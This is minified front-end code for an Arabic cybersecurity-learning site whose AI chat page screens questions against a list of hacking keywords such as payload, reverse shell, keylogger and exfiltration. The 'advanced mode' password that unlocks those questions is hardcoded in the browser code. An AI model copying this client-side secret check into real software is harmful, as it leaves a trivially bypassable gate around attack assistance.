                    className: "container mx-auto px-4 py-32 text-center relative z-10",
                    children: [
                        l.jsx("div", {
                            className: "flex justify-center mb-8 animate-float",
                            children: l.jsx("div", {
                                className: "cyber-icon-box",
                                children: l.jsx(Tr, { className: "w-10 h-10 text-primary" }),
                            }),
                        }),
                        l.jsx("h1", {
                            className:
                                "text-5xl md:text-7xl lg:text-8xl font-bold text-primary text-glow mb-6 animate-fade-in",
                            children: "Qusay_kali",
                        }),
                        l.jsx("p", {
                            className:
                                "text-xl md:text-2xl text-muted-foreground mb-4 animate-fade-in [animation-delay:0.2s]",
                            children: "منصة  متخصصة في الأمن السيبراني",
                        }),
                        l.jsx("p", {
                            className: "text-lg text-muted-foreground/70 mb-10 animate-fade-in [animation-delay:0.3s]",
                            children: "ذكاء اصطناعي • Ai (Qusay_kali)",
                        }),
                        l.jsxs("div", {
                            className:
                                "flex flex-col sm:flex-row gap-4 justify-center animate-fade-in [animation-delay:0.4s]",
                            children: [
                                l.jsx(fn, {
                                    to: "/ai",
                                    className: "cyber-button-primary",
                                    children: "ابدأ مع الذكاء الاصطناعي",
                                }),
                                l.jsx(fn, {
                                    to: "/cc",
                                    className: "cyber-button-outline",
                                    children: " تصفح الاوامر",
                                }),
                            ],
                        }),
                    ],
                }),
            ],
        }),
    lk = [
        {
            icon: pg,
            title: "ذكاء اصطناعي متخصص",
            description: "(كلمة السر بالانستا) AI متقدم متخصص في الأمن السيبراني يجيب على جميع استفساراتك بدقة وسرعة",
            link: "/ai",
        },
        { icon: fg, title: " اوامر كالي لينكس", description: " اوامر كالي لينكس الاساسية", link: "/cc" },
        {
            icon: Ar,
            title: "أدوات كالي لينكس",
            description: "18 اداة // 20 شرح بالعربي لكل اداة ",
            link: "/tools",
        },
        { icon: Vu, title: "السكربتات الجاهزة", description: " python .. c++ .. bash", link: "/scripts" },
        {
            icon: Tc,
            title: "الدليل الكامل",
            description: " الدليل الكامل للأمن السيبراني",
            link: "/guide",
        },
        {
            icon: sa,
            title: "تنزيل كالي لينكس",
            description: "روابط تنزيل مباشرة لجميع إصدارات Kali Linux مع شرح التثبيت",
            link: "/download",
        },
    ],
    ck = () =>
        l.jsxs("section", {
            className: "py-24 bg-background relative",
            children: [
                l.jsx("div", {
                    className:
                        "absolute top-0 left-1/2 -translate-x-1/2 w-[800px] h-[400px] bg-primary/5 rounded-full blur-[150px] pointer-events-none",
                }),
                l.jsxs("div", {
                    className: "container mx-auto px-4 relative z-10",
                    children: [
                        l.jsx("h2", {
                            className: "text-3xl md:text-4xl font-bold text-primary text-center mb-16 text-glow-sm",
                            children: "ميزات المنصة",
                        }),
                        l.jsx("div", {
                            className: "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6",
                            children: lk.map((e, t) =>
                                l.jsxs(
                                    fn,
                                    {
                                        to: e.link,
                                        className: "cyber-card p-6 group",
                                        style: { animationDelay: `${t * 0.1}s` },
                                        children: [
                                            l.jsx("div", {
                                                className:
                                                    "mb-4 transition-transform duration-300 group-hover:scale-110",
                                                children: l.jsx("div", {
                                                    className:
                                                        "w-12 h-12 rounded-xl bg-primary/10 border border-primary/30 flex items-center justify-center group-hover:box-glow-sm transition-all duration-300",
                                                    children: l.jsx(e.icon, { className: "w-6 h-6 text-primary" }),
                                                }),
                                            }),
                                            l.jsx("h3", {
                                                className:
                                                    "text-xl font-bold text-primary mb-3 group-hover:text-glow-sm transition-all duration-300",
                                                children: e.title,
                                            }),
                                            l.jsx("p", {
                                                className: "text-muted-foreground text-sm leading-relaxed",
                                                children: e.description,
                                            }),
                                        ],
                                    },
                                    t
                                )
                            ),
                        }),
                    ],
                }),
            ],
        }),
    uk = () =>
        l.jsxs("section", {
            className: "py-24 relative overflow-hidden",
            children: [
                l.jsx("div", {
                    className:
                        "absolute inset-0 bg-gradient-to-b from-background via-primary/5 to-background pointer-events-none",
                }),
                l.jsxs("div", {
                    className: "container mx-auto px-4 text-center relative z-10",
                    children: [
                        l.jsx("h2", {
                            className: "text-3xl md:text-4xl font-bold text-primary mb-4 text-glow-sm",
                            children: "ابدأ رحلتك في الأمن السيبراني الآن",
                        }),
                        l.jsx("p", { className: "text-muted-foreground text-lg mb-10", children: "100% الموقع مجاني" }),
                        l.jsxs("div", {
                            className: "flex flex-col sm:flex-row gap-4 justify-center",
                            children: [
                                l.jsx(fn, {
                                    to: "/guide",
                                    className: "cyber-button-primary",
                                    children: "الدليل الكامل",
                                }),
                                l.jsx(fn, {
                                    to: "/tools",
                                    className: "cyber-button-outline",
                                    children: "تصفح الأدوات",
                                }),
                            ],
                        }),
                    ],
                }),
            ],
        }),
    _r = () =>
        l.jsx("footer", {
            className: "py-12 border-t border-border/30 bg-background",
            children: l.jsx("div", {
                className: "container mx-auto px-4",
                children: l.jsxs("div", {
                    className: "flex flex-col md:flex-row items-center justify-between gap-6",
                    children: [
                        l.jsxs(fn, {
                            to: "/",
                            className: "flex items-center gap-3 group",
                            children: [
                                l.jsx("div", {
                                    className:
                                        "w-10 h-10 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center",
                                    children: l.jsx("span", {
                                        className: "text-primary font-bold text-xl",
                                        children: "Q",
                                    }),
                                }),
                                l.jsx("span", { className: "text-primary font-bold text-xl", children: "Qusay_kali" }),
                            ],
                        }),
                        l.jsx("p", {
                            className: "text-muted-foreground text-sm",
                            children: "© 2025 Qusay_kali. جميع الحقوق محفوظة",
                        }),
                        l.jsxs("div", {
                            className: "flex items-center gap-4",
                            children: [
                                l.jsx("a", {
                                    href: "https://www.instagram.com/qusay_kali1/",
                                    target: "_blank",
                                    rel: "noopener noreferrer",
                                    className:
                                        "w-10 h-10 rounded-xl bg-secondary border border-border/50 flex items-center justify-center hover:border-primary/50 hover:bg-primary/10 transition-all duration-300",
                                    "aria-label": "Instagram",
                                    children: l.jsx("svg", {
                                        className: "w-5 h-5 text-muted-foreground",
                                        fill: "currentColor",
                                        viewBox: "0 0 24 24",
                                        children: l.jsx("path", {
                                            d: "M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z",
                                        }),
                                    }),
                                }),
                                l.jsx("a", {
                                    href: "https://www.youtube.com/@Qusay_kali",
                                    target: "_blank",
                                    rel: "noopener noreferrer",
                                    className:
                                        "w-10 h-10 rounded-xl bg-secondary border border-border/50 flex items-center justify-center hover:border-primary/50 hover:bg-primary/10 transition-all duration-300",
                                    "aria-label": "YouTube",
                                    children: l.jsx("svg", {
                                        className: "w-5 h-5 text-muted-foreground",
                                        fill: "currentColor",
                                        viewBox: "0 0 24 24",
                                        children: l.jsx("path", {
                                            d: "M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z",
                                        }),
                                    }),
                                }),
                            ],
                        }),
                    ],
                }),
            }),
        }),
    dk = () =>
        l.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                l.jsx(Or, {}),
                l.jsxs("main", { children: [l.jsx(ak, {}), l.jsx(ck, {}), l.jsx(uk, {})] }),
                l.jsx(_r, {}),
            ],
        }),
    pk = [
        "اختراق",
        "هاك",
        "hack",
        "exploit",
        "ثغرة",
        "password",
        "كلمة مرور",
        "سرقة",
        "ddos",
        "attack",
        "هجوم",
        "malware",
        "فيروس",
        "ransomware",
        "backdoor",
        "payload",
        "shell",
        "root",
        "admin",
        "injection",
        "حقن",
        "bypass",
        "تجاوز",
        "brute",
        "crack",
        "كسر",
        "decrypt",
        "فك تشفير",
        "wifi",
        "واي فاي",
        "network",
        "شبكة",
        "server",
        "سيرفر",
        "database",
        "قاعدة بيانات",
        "sql",
        "xss",
        "csrf",
        "phishing",
        "تصيد",
        "spoof",
        "انتحال",
        "keylogger",
        "trojan",
        "rat",
        "botnet",
        "reverse",
        "meterpreter",
        "metasploit",
        "nmap",
        "kali",
        "penetration",
        "pentest",
        "vulnerability",
        "استغلال",
        "تجسس",
        "spy",
        "sniff",
        "intercept",
        "mitm",
        "man in the middle",
        "zero day",
        "0day",
        "buffer overflow",
        "privilege escalation",
        "تصعيد صلاحيات",
        "lateral movement",
        "persistence",
        "c2",
        "command and control",
        "exfiltration",
        "تسريب",
        "dump",
        "hash",
        "rainbow table",
        "wordlist",
        "dictionary attack",
        "social engineering",
        "reconnaissance",
        "footprinting",
        "enumeration",
        "scanning",
        "exploitation",
    ],
    zr = 3,
    fk = () => {
        var en;
        const [e, t] = x.useState([]),
            [n, r] = x.useState(""),
            [o, i] = x.useState(!1),
            [s, a] = x.useState(!1),
            [c, u] = x.useState(""),
            [d, p] = x.useState(!1),
            [m, f] = x.useState(""),
            [S, y] = x.useState(""),
            [w, g] = x.useState("ar"),
            [h, v] = x.useState([]),
            [b, k] = x.useState(null),
            [C, P] = x.useState(!1),
            A = x.useRef(null),
            L = x.useRef(null),
            M = x.useRef(null),
            U = x.useRef(null),
            F = x.useRef(null),
            G = "Qusay_kali",
            O = x.useCallback(() => {
                var I;
                (I = A.current) == null || I.scrollIntoView({ behavior: "smooth" });
            }, []);
        x.useEffect(() => {
            O();
        }, [e, O]);
        const X = (I) => {
                const Z = I.toLowerCase();
                return pk.some((ge) => Z.includes(ge.toLowerCase()));
            },
            H = x.useCallback(
                (I) => {
                    const ge = Array.from(I).filter((Ie) => Ie.type.startsWith("image/")),
                        ye = zr - h.length;
                    ge.slice(0, ye).forEach((Ie) => {
                        const Le = new FileReader();
                        (Le.onloadend = () => {
                            v((tn) => (tn.length < zr ? [...tn, Le.result] : tn));
                        }),
                            Le.readAsDataURL(Ie);
                    });
                },
                [h.length]
            ),
            $ = (I) => {
                const Z = I.target.files;
                Z && (H(Z), L.current && (L.current.value = ""));
            },
            E = (I) => {
                const Z = I.target.files;
                Z && (H(Z), M.current && (M.current.value = ""));
            },
            T = (I) => {
                var ge;
                const Z = (ge = I.target.files) == null ? void 0 : ge[0];
                Z && (_(Z), U.current && (U.current.value = ""));
            },
            _ = (I) => {
                var Le;
                const Z = [
                        "text/plain",
                        "text/html",
                        "text/css",
                        "text/javascript",
                        "application/json",
                        "application/xml",
                        "text/xml",
                        "text/markdown",
                        "text/csv",
                    ],
                    ge = [
                        ".txt",
                        ".html",
                        ".css",
                        ".js",
                        ".ts",
                        ".jsx",
                        ".tsx",
                        ".json",
                        ".xml",
                        ".md",
                        ".csv",
                        ".py",
                        ".java",
                        ".c",
                        ".cpp",
                        ".h",
                        ".php",
                        ".rb",
                        ".go",
                        ".rs",
                        ".swift",
                        ".kt",
                        ".sh",
                        ".bash",
                        ".zsh",
                        ".yaml",
                        ".yml",
                        ".toml",
                        ".ini",
                        ".cfg",
                        ".conf",
                        ".log",
                        ".sql",
                    ],
                    ye = "." + ((Le = I.name.split(".").pop()) == null ? void 0 : Le.toLowerCase());
                if (!(Z.includes(I.type) || ge.includes(ye))) {
                    alert(w === "ar" ? "يرجى اختيار ملف نصي فقط" : "Please select a text file only");
                    return;
                }
                if (I.size > 5e5) {
                    alert(w === "ar" ? "حجم الملف كبير جداً (الحد الأقصى 500KB)" : "File size too large (max 500KB)");
                    return;
                }
                const Ie = new FileReader();
                (Ie.onloadend = () => {
                    k({ name: I.name, content: Ie.result });
                }),
                    Ie.readAsText(I);
            },
            V = x.useCallback((I) => {
                I.preventDefault(), I.stopPropagation(), P(!0);
            }, []),
            B = x.useCallback((I) => {
                I.preventDefault(), I.stopPropagation(), I.currentTarget === F.current && P(!1);
            }, []),
            q = x.useCallback((I) => {
                I.preventDefault(), I.stopPropagation();
            }, []),
            Y = x.useCallback(
                (I) => {
                    I.preventDefault(), I.stopPropagation(), P(!1);
                    const Z = I.dataTransfer.files;
                    if (!Z.length) return;
                    const ge = [];
                    let ye = null;
                    Array.from(Z).forEach((ut) => {
                        ut.type.startsWith("image/") ? ge.push(ut) : ye || (ye = ut);
                    }),
                        ge.length > 0 && H(ge),
                        ye && !b && _(ye);
                },
                [H, b, w]
            ),
            he = (I) => {
                v((Z) => Z.filter((ge, ye) => ye !== I));
            },
            Ne = () => {
                k(null), U.current && (U.current.value = "");
            },
            te = async (I) => {
                if ((I.preventDefault(), (!n.trim() && h.length === 0 && !b) || o)) return;
                const Z = n.trim();
                if (X(Z) && !d) {
                    f(Z), a(!0), r("");
                    return;
                }
                Zt(Z, h, b), v([]), k(null);
            },
            Zt = async (I, Z, ge) => {
                var Ie, Le, tn, Sn;
                r("");
                const ye = { role: "user", content: I };
                Z && Z.length > 0 && (ye.images = Z), ge && (ye.file = ge);
                const ut = [...e, ye];
                t(ut), i(!0);
                try {
                    const _t = ut.map((we) => {
                            const bn = [];
                            let dt = we.content || "";
                            return (
                                we.file &&
                                    (dt += `

--- ${w === "ar" ? "محتوى الملف" : "File Content"}: ${we.file.name} ---
${we.file.content}
--- ${w === "ar" ? "نهاية الملف" : "End of File"} ---`),
                                (dt || (we.images && we.images.length > 0)) &&
                                    bn.push({
                                        type: "text",
                                        text: dt || (w === "ar" ? "ما هذه الصور؟" : "What are these images?"),
                                    }),
                                we.images &&
                                    we.images.length > 0 &&
                                    we.images.forEach((kn) => {
                                        bn.push({ type: "image_url", image_url: { url: kn } });
                                    }),
                                bn.length > 1 || (we.images && we.images.length > 0)
                                    ? { role: we.role, content: bn }
                                    : { role: we.role, content: dt }
                            );
                        }),
                        tt = await fetch("https://breyobjsazysyeozhrkq.supabase.co/functions/v1/ai-chat", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                                Authorization:
                                    "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJyZXlvYmpzYXp5c3llb3pocmtxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY4MTU3MzQsImV4cCI6MjA4MjM5MTczNH0.A-UpHE-LZ0BGp09vMWwUEG7v1u3Rl99o9XANIxUxhu4",
                            },
                            body: JSON.stringify({ messages: _t, language: w }),
                        });
                    if (!tt.ok) {
                        const we = await tt.json();
                        throw new Error(we.error || "Failed to get response");
                    }
                    const Hi = (Ie = tt.body) == null ? void 0 : Ie.getReader();
                    if (!Hi) throw new Error("No response body");
                    const Va = new TextDecoder();
                    let Ue = "",
                        Ft = "";
                    for (t((we) => [...we, { role: "assistant", content: "" }]); ; ) {
                        const { done: we, value: bn } = await Hi.read();
                        if (we) break;
                        Ft += Va.decode(bn, { stream: !0 });
                        const dt = Ft.split(`
`);
                        Ft = dt.pop() || "";
                        for (const kn of dt) {
                            if (kn.startsWith(":") || kn.trim() === "" || !kn.startsWith("data: ")) continue;
                            const Lo = kn.slice(6).trim();
                            if (Lo !== "[DONE]")
                                try {
                                    const nn =
                                        (Sn =
                                            (tn = (Le = JSON.parse(Lo).choices) == null ? void 0 : Le[0]) == null
                                                ? void 0
                                                : tn.delta) == null
                                            ? void 0
                                            : Sn.content;
                                    nn &&
                                        ((Ue += nn),
                                        t((Vi) => {
                                            const zt = [...Vi];
                                            return (zt[zt.length - 1] = { role: "assistant", content: Ue }), zt;
                                        }));
                                } catch {}
                        }
                    }
                } catch (_t) {
                    console.error("Error:", _t),
                        t((tt) => [
                            ...tt,
                            {
                                role: "assistant",
                                content:
                                    w === "ar"
                                        ? `❌ حدث خطأ: ${_t instanceof Error ? _t.message : "خطأ غير معروف"}. حاول مرة أخرى.`
                                        : `❌ Error: ${_t instanceof Error ? _t.message : "Unknown error"}. Please try again.`,
                            },
                        ]);
                } finally {
                    i(!1);
                }
            },
            Ot = (I) => {
                I.preventDefault(),
                    c === G || c.toLowerCase() === G.toLowerCase()
                        ? (p(!0), a(!1), y(""), m && (Zt(m), f("")))
                        : y(
                              w === "ar"
                                  ? "كلمة السر غير صحيحة. تواصل مع المطور على انستغرام للحصول عليها."
                                  : "Incorrect password. Contact the developer on Instagram to get it."
                          ),
                    u("");
            },
            Jt = () => {
                g((I) => (I === "ar" ? "en" : "ar"));
            },
            re = {
                title: "Qusay AI",
                subtitle: w === "ar" ? "مساعدك الذكي في الأمن السيبراني" : "Your smart cybersecurity assistant",
                developer: w === "ar" ? "تطوير: Qusay_kali" : "Developed by: Qusay_kali",
                advancedMode: w === "ar" ? "وضع متقدم مفعّل" : "Advanced mode enabled",
                welcome: w === "ar" ? " مرحباً بك يا هكر !" : "Welcome, hacker!",
                askAnything: w === "ar" ? "اسألني أي سؤال عن الأمن السيبراني" : "Ask me anything about cybersecurity",
                advancedTip:
                    w === "ar"
                        ? "  "
                        : "",
                typePlaceholder: w === "ar" ? "اكتب سؤالك هنا..." : "Type your question here...",
                advancedRequest: w === "ar" ? "طلب متقدم" : "Advanced Request",
                advancedDesc:
                    w === "ar"
                        ? "هذا السؤال يتطلب صلاحيات متقدمة. أدخل كلمة السر للمتابعة."
                        : "This question requires advanced permissions. Enter the password to continue.",
                passwordHint:
                    w === "ar"
                        ? "للحصول على كلمة السر، تواصل مع المطور على انستغرام"
                        : "To get the password, contact the developer on Instagram",
                enterPassword: w === "ar" ? "أدخل كلمة السر..." : "Enter password...",
                cancel: w === "ar" ? "إلغاء" : "Cancel",
                confirm: w === "ar" ? "تأكيد" : "Confirm",
                contactInstagram: w === "ar" ? "تواصل على انستغرام" : "Contact on Instagram",
                addImages: w === "ar" ? `صور (${h.length}/${zr})` : `Images (${h.length}/${zr})`,
                addFile: w === "ar" ? "ملف" : "File",
                camera: w === "ar" ? "كاميرا" : "Camera",
                supportedFormats:
                    w === "ar"
                        ? ""
                        : "",
                dropHere: w === "ar" ? "أفلت الملفات هنا" : "Drop files here",
            };
        return l.jsxs("div", {
            className: "min-h-screen bg-background flex flex-col",
            children: [
                l.jsx(Or, {}),
                l.jsx("main", {
                    className: "flex-1 pt-24 pb-8 flex flex-col",
                    children: l.jsxs("div", {
                        className: "container mx-auto px-4 flex-1 flex flex-col max-w-4xl",
                        children: [
                            l.jsxs("div", {
                                className: "text-center mb-6",
                                children: [
                                    l.jsx("div", {
                                        className: "flex justify-center mb-4",
                                        children: l.jsx("div", {
                                            className: "cyber-icon-box w-16 h-16",
                                            children: l.jsx(pg, { className: "w-8 h-8 text-primary" }),
                                        }),
                                    }),
                                    l.jsx("h1", {
                                        className: "text-3xl md:text-4xl font-bold text-primary text-glow mb-2",
                                        children: re.title,
                                    }),
                                    l.jsx("p", { className: "text-muted-foreground", children: re.subtitle }),
                                    l.jsx("p", { className: "text-xs text-primary/70 mt-1", children: re.developer }),
                                    l.jsxs("div", {
                                        className: "flex items-center justify-center gap-3 mt-4",
                                        children: [
                                            d &&
                                                l.jsxs("span", {
                                                    className:
                                                        "inline-flex items-center gap-2 px-3 py-1 rounded-full bg-primary/20 text-primary text-sm",
                                                    children: [l.jsx(Rc, { className: "w-4 h-4" }), re.advancedMode],
                                                }),
                                            l.jsxs("button", {
                                                onClick: Jt,
                                                className:
                                                    "inline-flex items-center gap-2 px-3 py-1 rounded-full bg-secondary border border-border/50 text-muted-foreground text-sm hover:border-primary/50 transition-colors",
                                                children: [
                                                    l.jsx(zi, { className: "w-4 h-4" }),
                                                    w === "ar" ? "English" : "العربية",
                                                ],
                                            }),
                                        ],
                                    }),
                                ],
                            }),
                            l.jsxs("div", {
                                ref: F,
                                className: `flex-1 cyber-card overflow-hidden flex flex-col relative transition-all duration-200 ${C ? "border-primary border-2 bg-primary/5" : ""}`,
                                onDragEnter: V,
                                onDragLeave: B,
                                onDragOver: q,
                                onDrop: Y,
                                children: [
                                    C &&
                                        l.jsx("div", {
                                            className:
                                                "absolute inset-0 z-20 flex items-center justify-center bg-background/90 backdrop-blur-sm",
                                            children: l.jsxs("div", {
                                                className: "text-center",
                                                children: [
                                                    l.jsx(Sg, {
                                                        className: "w-16 h-16 text-primary mx-auto mb-4 animate-bounce",
                                                    }),
                                                    l.jsx("p", {
                                                        className: "text-xl font-bold text-primary",
                                                        children: re.dropHere,
                                                    }),
                                                    l.jsx("p", {
                                                        className: "text-sm text-muted-foreground mt-2",
                                                        children: re.supportedFormats,
                                                    }),
                                                ],
                                            }),
                                        }),
                                    l.jsxs("div", {
                                        className: "flex-1 overflow-y-auto p-4 space-y-4",
                                        children: [
                                            e.length === 0
                                                ? l.jsxs("div", {
                                                      className: "text-center py-12 text-muted-foreground",
                                                      children: [
                                                          l.jsx(bl, { className: "w-16 h-16 mx-auto mb-4 opacity-50" }),
                                                          l.jsx("p", {
                                                              className: "text-lg mb-2",
                                                              children: re.welcome,
                                                          }),
                                                          l.jsx("p", {
                                                              className: "text-sm",
                                                              children: re.askAnything,
                                                          }),
                                                          l.jsx("p", {
                                                              className:
                                                                  "text-xs text-muted-foreground/70 mt-4 max-w-md mx-auto",
                                                              children: re.supportedFormats,
                                                          }),
                                                          l.jsxs("div", {
                                                              className: "mt-6 flex flex-col items-center gap-3",
                                                              children: [
                                                                  l.jsxs("p", {
                                                                      className:
                                                                          "text-xs text-muted-foreground/70 max-w-md",
                                                                      children: [" ", re.advancedTip],
                                                                  }),
                                                                  l.jsxs("a", {
                                                                      href: "https://www.instagram.com/qusay_kali1/",
                                                                      target: "_blank",
                                                                      rel: "noopener noreferrer",
                                                                      className:
                                                                          "inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-gradient-to-r from-purple-500 to-pink-500 text-white text-sm font-medium hover:opacity-90 transition-opacity",
                                                                      children: [
                                                                          l.jsx(Ap, { className: "w-4 h-4" }),
                                                                          re.contactInstagram,
                                                                      ],
                                                                  }),
                                                              ],
                                                          }),
                                                      ],
                                                  })
                                                : e.map((I, Z) =>
                                                      l.jsxs(
                                                          "div",
                                                          {
                                                              className: `flex items-start gap-3 ${I.role === "user" ? "flex-row-reverse" : ""}`,
                                                              children: [
                                                                  l.jsx("div", {
                                                                      className: `w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 ${I.role === "user" ? "bg-primary/20 border border-primary/30" : "bg-secondary border border-border/50"}`,
                                                                      children:
                                                                          I.role === "user"
                                                                              ? l.jsx(Mc, {
                                                                                    className: "w-5 h-5 text-primary",
                                                                                })
                                                                              : l.jsx(bl, {
                                                                                    className:
                                                                                        "w-5 h-5 text-muted-foreground",
                                                                                }),
                                                                  }),
                                                                  l.jsxs("div", {
                                                                      className: `max-w-[80%] rounded-2xl p-4 ${I.role === "user" ? "bg-primary/20 border border-primary/30" : "bg-secondary border border-border/50"}`,
                                                                      children: [
                                                                          I.images &&
                                                                              I.images.length > 0 &&
                                                                              l.jsx("div", {
                                                                                  className: `grid gap-2 mb-3 ${I.images.length === 1 ? "grid-cols-1" : I.images.length === 2 ? "grid-cols-2" : "grid-cols-3"}`,
                                                                                  children: I.images.map((ge, ye) =>
                                                                                      l.jsx(
                                                                                          "img",
                                                                                          {
                                                                                              src: ge,
                                                                                              alt: `Uploaded ${ye + 1}`,
                                                                                              className:
                                                                                                  "w-full h-auto rounded-lg max-h-40 object-cover",
                                                                                          },
                                                                                          ye
                                                                                      )
                                                                                  ),
                                                                              }),
                                                                          I.file &&
                                                                              l.jsxs("div", {
                                                                                  className:
                                                                                      "flex items-center gap-2 px-3 py-2 rounded-lg bg-background/50 border border-border/30 mb-3",
                                                                                  children: [
                                                                                      l.jsx(In, {
                                                                                          className:
                                                                                              "w-4 h-4 text-primary",
                                                                                      }),
                                                                                      l.jsx("span", {
                                                                                          className:
                                                                                              "text-sm text-foreground",
                                                                                          children: I.file.name,
                                                                                      }),
                                                                                  ],
                                                                              }),
                                                                          I.content &&
                                                                              l.jsx("p", {
                                                                                  className:
                                                                                      "text-foreground whitespace-pre-wrap leading-relaxed",
                                                                                  children: I.content,
                                                                              }),
                                                                      ],
                                                                  }),
                                                              ],
                                                          },
                                                          Z
                                                      )
                                                  ),
                                            o &&
                                                ((en = e[e.length - 1]) == null ? void 0 : en.role) === "user" &&
                                                l.jsxs("div", {
                                                    className: "flex items-start gap-3",
                                                    children: [
                                                        l.jsx("div", {
                                                            className:
                                                                "w-10 h-10 rounded-xl bg-secondary border border-border/50 flex items-center justify-center",
                                                            children: l.jsx(bl, {
                                                                className: "w-5 h-5 text-muted-foreground",
                                                            }),
                                                        }),
                                                        l.jsx("div", {
                                                            className:
                                                                "bg-secondary border border-border/50 rounded-2xl p-4",
                                                            children: l.jsxs("div", {
                                                                className: "flex gap-1",
                                                                children: [
                                                                    l.jsx("span", {
                                                                        className:
                                                                            "w-2 h-2 bg-primary rounded-full animate-bounce",
                                                                        style: { animationDelay: "0ms" },
                                                                    }),
                                                                    l.jsx("span", {
                                                                        className:
                                                                            "w-2 h-2 bg-primary rounded-full animate-bounce",
                                                                        style: { animationDelay: "150ms" },
                                                                    }),
                                                                    l.jsx("span", {
                                                                        className:
                                                                            "w-2 h-2 bg-primary rounded-full animate-bounce",
                                                                        style: { animationDelay: "300ms" },
                                                                    }),
                                                                ],
                                                            }),
                                                        }),
                                                    ],
                                                }),
                                            l.jsx("div", { ref: A }),
                                        ],
                                    }),
                                    l.jsxs("form", {
                                        onSubmit: te,
                                        className: "p-4 border-t border-border/30",
                                        children: [
                                            (h.length > 0 || b) &&
                                                l.jsxs("div", {
                                                    className: "mb-3 flex flex-wrap gap-2",
                                                    children: [
                                                        h.map((I, Z) =>
                                                            l.jsxs(
                                                                "div",
                                                                {
                                                                    className: "relative",
                                                                    children: [
                                                                        l.jsx("img", {
                                                                            src: I,
                                                                            alt: `Preview ${Z + 1}`,
                                                                            className:
                                                                                "h-20 w-20 object-cover rounded-lg border border-border/50",
                                                                        }),
                                                                        l.jsx("button", {
                                                                            type: "button",
                                                                            onClick: () => he(Z),
                                                                            className:
                                                                                "absolute -top-2 -right-2 w-6 h-6 rounded-full bg-destructive text-destructive-foreground flex items-center justify-center hover:opacity-80",
                                                                            children: l.jsx(la, {
                                                                                className: "w-4 h-4",
                                                                            }),
                                                                        }),
                                                                    ],
                                                                },
                                                                Z
                                                            )
                                                        ),
                                                        b &&
                                                            l.jsxs("div", {
                                                                className:
                                                                    "relative flex items-center gap-2 px-3 py-2 rounded-lg bg-secondary border border-border/50",
                                                                children: [
                                                                    l.jsx(In, { className: "w-5 h-5 text-primary" }),
                                                                    l.jsx("span", {
                                                                        className:
                                                                            "text-sm text-foreground max-w-[150px] truncate",
                                                                        children: b.name,
                                                                    }),
                                                                    l.jsx("button", {
                                                                        type: "button",
                                                                        onClick: Ne,
                                                                        className:
                                                                            "w-5 h-5 rounded-full bg-destructive text-destructive-foreground flex items-center justify-center hover:opacity-80",
                                                                        children: l.jsx(la, { className: "w-3 h-3" }),
                                                                    }),
                                                                ],
                                                            }),
                                                    ],
                                                }),
                                            l.jsxs("div", {
                                                className: "flex gap-2",
                                                children: [
                                                    l.jsx("input", {
                                                        type: "file",
                                                        ref: M,
                                                        onChange: E,
                                                        accept: "image/*",
                                                        capture: "environment",
                                                        className: "hidden",
                                                    }),
                                                    l.jsx("button", {
                                                        type: "button",
                                                        onClick: () => {
                                                            var I;
                                                            return (I = M.current) == null ? void 0 : I.click();
                                                        },
                                                        disabled: h.length >= zr,
                                                        className:
                                                            "px-3 py-3 rounded-xl bg-secondary border border-border/50 text-muted-foreground hover:border-primary/50 hover:text-primary transition-all disabled:opacity-50 disabled:cursor-not-allowed",
                                                        title: re.camera,
                                                        children: l.jsx(cx, { className: "w-5 h-5" }),
                                                    }),
                                                    l.jsx("input", {
                                                        type: "file",
                                                        ref: L,
                                                        onChange: $,
                                                        accept: "image/*",
                                                        multiple: !0,
                                                        className: "hidden",
                                                    }),
                                                    l.jsx("button", {
                                                        type: "button",
                                                        onClick: () => {
                                                            var I;
                                                            return (I = L.current) == null ? void 0 : I.click();
                                                        },
                                                        disabled: h.length >= zr,
                                                        className:
                                                            "px-3 py-3 rounded-xl bg-secondary border border-border/50 text-muted-foreground hover:border-primary/50 hover:text-primary transition-all disabled:opacity-50 disabled:cursor-not-allowed",
                                                        title: re.addImages,
                                                        children: l.jsx(yx, { className: "w-5 h-5" }),
                                                    }),
                                                    l.jsx("input", {
                                                        type: "file",
                                                        ref: U,
                                                        onChange: T,
